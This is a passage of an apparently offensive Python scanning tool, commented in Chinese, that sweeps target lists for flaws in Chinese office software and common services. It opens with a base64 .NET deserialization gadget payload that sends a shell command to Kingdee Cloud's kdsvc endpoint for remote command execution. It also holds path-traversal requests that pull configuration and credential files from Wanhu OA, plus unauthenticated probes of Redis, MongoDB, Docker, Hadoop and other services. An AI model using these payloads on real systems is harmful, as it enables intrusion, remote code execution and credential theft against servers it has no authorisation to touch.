BGQAAAA8AAAAGNgAAAClTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlBhZ2VkRGF0YVNvdXJjZQQAAAAGNwAAAE1TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYRAaAAAABwAAAAkIAAAACAgAAAAACAgKAAAACAEACAEACAEACAgAAAAAARsAAAAPAAAABjkAAAApU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5EZXNpZ25lclZlcmIEAAAABjoAAABJU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAcAAAABQAAAA0CCTsAAAAICAMAAAAJCwAAAAEdAAAADwAAAAY9AAAANFN5c3RlbS5SdW50aW1lLlJlbW90aW5nLkNoYW5uZWxzLkFnZ3JlZ2F0ZURpY3Rpb25hcnkEAAAABj4AAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5EB4AAAABAAAACQkAAAAQHwAAAAIAAAAJCgAAAAkKAAAAECAAAAACAAAABkEAAAAACUEAAAAEJAAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAgAAAAhEZWxlZ2F0ZQdtZXRob2QwAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCUIAAAAJQwAAAAEoAAAAJAAAAAlEAAAACUUAAAABLAAAACQAAAAJRgAAAAlHAAAAATAAAAAkAAAACUgAAAAJSQAAAAExAAAAJAAAAAlKAAAACUsAAAABNQAAACQAAAAJTAAAAAlNAAAAATsAAAAEAAAACU4AAAAJTwAAAARCAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BlAAAADVAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5CeXRlW10sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABlIAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkGUwAAAARMb2FkCgRDAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBwAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlClNpZ25hdHVyZTIKTWVtYmVyVHlwZRBHZW5lcmljQXJndW1lbnRzAQEBAQEAAwgNU3lzdGVtLlR5cGVbXQlTAAAACT4AAAAJUgAAAAZWAAAAJ1N5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQZXAAAALlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IExvYWQoU3lzdGVtLkJ5dGVbXSkIAAAACgFEAAAAQgAAAAZYAAAAzAJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAACVIAAAAGWwAAAAhHZXRUeXBlcwoBRQAAAEMAAAAJWwAAAAk+AAAACVIAAAAGXgAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkGXwAAABhTeXN0ZW0uVHlwZVtdIEdldFR5cGVzKCkIAAAACgFGAAAAQgAAAAZgAAAAtgNTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZiAAAAhAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GYwAAAA1HZXRFbnVtZXJhdG9yCgFHAAAAQwAAAAljAAAACT4AAAAJYgAAAAZmAAAARVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbU3lzdGVtLlR5cGVdIEdldEVudW1lcmF0b3IoKQZnAAAAlAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0gR2V0RW51bWVyYXRvcigpCAAAAAoBSAAAAEIAAAAGaAAAAMACU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQm9vbGVhbiwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZqAAAAHlN5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYXRvcgZrAAAACE1vdmVOZXh0CgFJAAAAQwAAAAlrAAAACT4AAAAJagAAAAZuAAAAEkJvb2xlYW4gTW92ZU5leHQoKQZvAAAAGVN5c3RlbS5Cb29sZWFuIE1vdmVOZXh0KCkIAAAACgFKAAAAQgAAAAZwAAAAvQJTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk+AAAACgk+AAAABnIAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQZzAAAAC2dldF9DdXJyZW50CgFLAAAAQwAAAAlzAAAACT4AAAAJcgAAAAZ2AAAAGVN5c3RlbS5UeXBlIGdldF9DdXJyZW50KCkGdwAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpCAAAAAoBTAAAAEIAAAAGeAAAAMYBU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGegAAABBTeXN0ZW0uQWN0aXZhdG9yBnsAAAAOQ3JlYXRlSW5zdGFuY2UKAU0AAABDAAAACXsAAAAJPgAAAAl6AAAABn4AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkGfwAAAClTeXN0ZW0uT2JqZWN0IENyZWF0ZUluc3RhbmNlKFN5c3RlbS5UeXBlKQgAAAAKAU4AAAAPAAAABoAAAAAmU3lzdGVtLkNvbXBvbmVudE1vZGVsLkRlc2lnbi5Db21tYW5kSUQEAAAACToAAAAQTwAAAAIAAAAJggAAAAgIACAAAASCAAAAC1N5c3RlbS5HdWlkCwAAAAJfYQJfYgJfYwJfZAJfZQJfZgJfZwJfaAJfaQJfagJfawAAAAAAAAAAAAAACAcHAgICAgICAgITE9J07irREYv7AKDJDyb3Cws=","format":"3"}
        ksdsvc_header = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
            'cmd': 'ipconfig',
            'Content-Type': 'text/json'
        }
        try:
            # 忽略ssl证书验证
            kinddeeoa_kdsvc_res = requests.post(url+kinddeeoa_kdsvc_dir,headers=ksdsvc_header,allow_redirects=False,timeout=custom_poc_timeout,verify=False,json=data)
            kinddeeoa_kdsvc_res.encoding='utf-8'
            kinddeeoa_kdsvc_res_text = kinddeeoa_kdsvc_res.text
            # print(kinddeeoa_kdsvc_res_text)
            
            if kinddeeoa_kdsvc_res.status_code == 200 and  '默认网关' in kinddeeoa_kdsvc_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+kinddeeoa_kdsvc_dir+" "+"存在金蝶OA 云星空 kdsvc 远程命令执行漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在金蝶OA 云星空 kdsvc 远程命令执行漏洞")
        except:
            pass


# 万户OA漏洞扫描
def wanhuoa_vuln_scan():
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    url_list = basic.url_file_ip_list()
    hearder={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
    }
    for url in url_list:
        print("url:"+url)
        # 1、万户OA DownloadServlet 任意文件读取漏洞
        wanhu_DownloadServlet_dir = "/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2"
        try:
            # 忽略ssl证书验证
            wanhu_DownloadServlet_res = requests.get(url+wanhu_DownloadServlet_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            wanhu_DownloadServlet_res.encoding='utf-8'
            wanhu_DownloadServlet_res_text = wanhu_DownloadServlet_res.text
            
            if wanhu_DownloadServlet_res.status_code == 200  and  'ccerp' in wanhu_DownloadServlet_res_text and 'driver=' in wanhu_DownloadServlet_res_text and 'debug=' in wanhu_DownloadServlet_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+wanhu_DownloadServlet_dir+" "+"存在万户OA DownloadServlet 任意文件读取漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在万户OA DownloadServlet 任意文件读取漏洞")
        except:
            pass

        # 2、万户OA download_ftp.jsp 任意文件下载漏洞
        wanhu_download_ftp_dir = "/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml"
        try:
            # 忽略ssl证书验证
            wanhu_download_ftp_res = requests.get(url+wanhu_download_ftp_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            wanhu_download_ftp_res.encoding='utf-8'
            wanhu_download_ftp_res_text = wanhu_download_ftp_res.text
            
            if wanhu_download_ftp_res.status_code == 200  and  'web-app' in wanhu_download_ftp_res_text and 'display-name' in wanhu_download_ftp_res_text and 'param-name' in wanhu_download_ftp_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+wanhu_download_ftp_dir+" "+"存在万户OA download_ftp.jsp 任意文件下载漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在万户OA download_ftp.jsp 任意文件下载漏洞")
        except:
            pass

        # 3、万户OA download_old.jsp 任意文件下载漏洞
        wanhu_download_old_dir = "/defaultroot/download_old.jsp?path=..&name=x&FileName=download_old.jsp"
        try:
            # 忽略ssl证书验证
            wanhu_download_old_res = requests.get(url+wanhu_download_old_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            wanhu_download_old_res.encoding='utf-8'
            wanhu_download_old_res_text = wanhu_download_old_res.text
            
            if wanhu_download_old_res.status_code == 200  and  '得到文件名字和路径' in wanhu_download_old_res_text and '长度不能超过150位' in wanhu_download_old_res_text and 'endIndex' in wanhu_download_old_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+wanhu_download_old_dir+" "+"存在万户OA download_old.jsp 任意文件下载漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在万户OA download_old.jsp 任意文件下载漏洞")
        except:
            pass
        # 4、万户OA downloadhttp.jsp 任意文件下载漏洞
        wanhu_downloadhttp_dir = "/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp"
        try:
            # 忽略ssl证书验证
            wanhu_downloadhttp_res = requests.get(url+wanhu_downloadhttp_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            wanhu_downloadhttp_res.encoding='utf-8'
            wanhu_downloadhttp_res_text = wanhu_downloadhttp_res.text
            
            if wanhu_downloadhttp_res.status_code == 200  and  'Username' in wanhu_downloadhttp_res_text and 'Password' in wanhu_downloadhttp_res_text and 'Style' in wanhu_downloadhttp_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+wanhu_downloadhttp_dir+" "+"存在万户OA downloadhttp.jsp 任意文件下载漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在万户OA downloadhttp.jsp 任意文件下载漏洞")
        except:
            pass


# redis未授权访问扫描
def redis_unauthorizedset_scan_lib(ip):
    try:
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 6379))
        s.send(bytes("INFO\r\n", 'UTF-8'))
        result = s.recv(1024).decode()
        if "redis_version" in result:
            print(ip + ":6379 存在redis未授权访问漏洞")
        s.close()
    except:
        pass
        

# mongodb未授权访问扫描
def mongodb_unauthorizedset_scan_lib(ip):
    try:
        conn = pymongo.MongoClient(ip, 27017, socketTimeoutMS=100)
        dbname = conn.list_database_names()
        if len(dbname) >= 1:
            print(ip + ":27017 存在mongodb未授权访问漏洞")
        conn.close()
    except:
        pass
        

# memcached未授权访问扫描
def memcached_unauthorizedset_scan_lib(ip):
    try:
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 11211))
        s.send(bytes('stats\r\n', 'UTF-8'))
        result = s.recv(1024).decode()
        if "version" in result:
            print(ip + ":11211 存在memcached未授权访问漏洞")
        s.close()
    except:
        pass
        
# zookeeper未授权访问扫描
def zookeeper_unauthorizedset_scan_lib(ip):
    try:
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 2181))
        s.send(bytes('envi\r\n', 'UTF-8'))
        result = s.recv(1024).decode()
        if "Environment" in result:
            print(ip + ":2181 存在zookeeper未授权访问漏洞")
        s.close()
    except:
        pass

# ftp未授权访问扫描
def ftp_unauthorizedset_scan_lib(ip):
    try:
        
        ftp = ftplib.FTP.connect(ip,21,timeout=5)
        ftp.login('anonymous', '12345678')
        print(ip + ":21 存在FTP未授权访问漏洞")
    except:
        pass


# CouchDB未授权扫描
def couchdb_unauthorizedset_scan_lib(ip):
    try:
        url = 'http://' + ip + ':5984'+'/_utils/'
        r = requests.get(url, timeout=5)
        if 'couchdb-logo' in r.content.decode():
            print(ip + ":5984/_utils 存在CouchDB未授权访问漏洞")
    except:
        pass


# docker未授权扫描
def docker_unauthorizedset_scan_lib(ip):
    try:
        url = 'http://' + ip + ':2375'+'/version'
        r = requests.get(url, timeout=5)
        if 'ApiVersion' in r.content.decode():
            print(ip + ":2375/version 存在docker api未授权访问漏洞")
    except:
        pass


# hadoop未授权扫描
def hadoop_unauthorizedset_scan_lib(ip):
    try:
        url = 'http://' + ip + ':50070'+'/dfshealth.html'
        r = requests.get(url, timeout=5)
        if 'hadoop.css' in r.content.decode():
            print(ip + ":50070/dfshealth.html 存在Hadoop未授权访问漏洞")
    except:
        pass

# NFS未授权扫描
def nfs_unauthorizedset_scan_lib(ip):
    try:
        nfstext = "showmount  -e  " + ip
        result = os.popen(nfstext)
        for line in result:
            if "Export list" in line:
                print(ip + "存在NFS未授权访问漏洞")
    except:
        pass


# rsync未授权扫描
def rsync_unauthorizedset_scan_lib(ip):
    try:
        socket.setdefaulttimeout(5)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 873))
        s.send(bytes("", 'UTF-8'))
        result = s.recv(1024).decode()
        if "RSYNCD" in result:
            print(ip+" "+"可能存在rsync未授权,需要手工确认："+" "+"rsync rsync://"+ip+":873/")
    except:
        pass
    



if __name__ == "__main__":
    if len(sys.argv) > 1:
        func_name = sys.argv[1]
        if func_name == 'es_unauthorized':
            es_unauthorized()
        elif func_name == 'nacos_vuln_scan':
            nacos_vuln_scan()
        elif func_name == 'chandao_vuln_scan':
            chandao_vuln_scan()
        elif func_name == 'tomcat_vuln_scan':
            tomcat_vuln_scan()
        elif func_name == 'fastjson_vuln_scan':
            fastjson_vuln_scan()
        elif func_name == 'lanlingoa_vuln_scan':
            lanlingoa_vuln_scan()
        elif func_name == 'waf_tool_scan':
            waf_tool_scan()
        elif func_name == 'phpmyadmin_vuln_scan':
            phpmyadmin_vuln_scan()
        elif func_name == 'seeyon_vuln_scan':
            seeyon_vuln_scan()
        elif func_name == 'yonsuite_vuln_scan':
            yonsuite_vuln_scan() 
        elif func_name == 'kingdeeoa_vuln_scan':
            kingdeeoa_vuln_scan()   
        elif func_name == 'wanhuoa_vuln_scan':
            wanhuoa_vuln_scan()
        elif func_name == 'redis_unauthorizedset_scan_lib':
            # 利用线程池
            ip_list = basic.url_convert_ip()
            # ip列表文件去重
            ip_list_uniq =  list(set(ip_list)) 
            with ThreadPoolExecutor(threadnum) as pool:
                for target in ip_list_uniq:
                    target=target.strip()
                    pool.submit(redis_unauthorizedset_scan_lib, target)
        elif func_name == 'mongodb_unauthorizedset_scan_lib':
            # 利用线程池
            ip_list = basic.url_convert_ip()
            # ip列表文件去重
            ip_list_uniq =  list(set(ip_list)) 
            with ThreadPoolExecutor(threadnum) as pool:
                for target in ip_list_uniq:
                    target=target.strip()
                    pool.submit(mongodb_unauthorizedset_scan_lib, target)
        elif func_name == 'memcached_unauthorizedset_scan_lib':
            # 利用线程池
            ip_list = basic.url_convert_ip()
            # ip列表文件去重
            ip_list_uniq =  list(set(ip_list)) 
            with ThreadPoolExecutor(threadnum) as pool:
                for target in ip_list_uniq:
                    target=target.strip()
                    pool.submit(memcached_unauthorizedset_scan_lib, target)
        elif func_name == 'zookeeper_unauthorizedset_scan_lib':
            # 利用线程池
            ip_list = basic.url_convert_ip()
            # ip列表文件去重
            ip_list_uniq =  list(set(ip_list)) 
            with ThreadPoolExecutor(threadnum) as pool:
                for target in ip_list_uniq:
                    target=target.strip()
                    pool.submit(zookeeper_unauthorizedset_scan_lib, target)
        elif func_name == 'ftp_unauthorizedset_scan_lib':
            # 利用线程池
            ip_list = basic.url_convert_ip()
            # ip列表文件去重
            ip_list_uniq =  list(set(ip_list)) 
            with ThreadPoolExecutor(threadnum) as pool:
                for target in ip_list_uniq:
                    target=target.strip()
                    pool.submit(ftp_unauthorizedset_scan_lib, target)
        elif func_name == 'couchdb_unauthorizedset_scan_lib':
            # 利用线程池
            ip_list = basic.url_convert_ip()
            # ip列表文件去重
            ip_list_uniq =  list(set(ip_list)) 
            with ThreadPoolExecutor(threadnum) as pool:
                for target in ip_list_uniq:
                    target=target.strip()
                    pool.submit(couchdb_unauthorizedset_scan_lib, target)
        
        elif func_name == 'docker_unauthorizedset_scan_lib':
            # 利用线程池
            ip_list = basic.url_convert_ip()
            # ip列表文件去重
            ip_list_uniq =  list(set(ip_list)) 
            with ThreadPoolExecutor(threadnum) as pool:
                for target in ip_list_uniq:
                    target=target.strip()
                    pool.submit(docker_unauthorizedset_scan_lib, target)
        elif func_name == 'hadoop_unauthorizedset_scan_lib':
            # 利用线程池
            ip_list = basic.url_convert_ip()
            # ip列表文件去重
            ip_list_uniq =  list(set(ip_list)) 
            with ThreadPoolExecutor(threadnum) as pool:
                for target in ip_list_uniq:
                    target=target.strip()
                    pool.submit(hadoop_unauthorizedset_scan_lib, target)

        elif func_name == 'nfs_unauthorizedset_scan_lib':
            # 利用线程池
            ip_list = basic.url_convert_ip()
            # ip列表文件去重
            ip_list_uniq =  list(set(ip_list)) 
            with ThreadPoolExecutor(threadnum) as pool:
                for target in ip_list_uniq:
                    target=target.strip()
                    pool.submit(nfs_unauthorizedset_scan_lib, target)

        elif func_name == 'rsync_unauthorizedset_scan_lib':
            # 利用线程池
            ip_list = basic.url_convert_ip()
            # ip列表文件去重
            ip_list_uniq =  list(set(ip_list)) 
            with ThreadPoolExecutor(threadnum) as pool:
                for target in ip_list_uniq:
                    target=target.strip()
                    pool.submit(rsync_unauthorizedset_scan_lib, target)
                                    
        else:
            print("Invalid function number")
    else:
        print("No function number provided")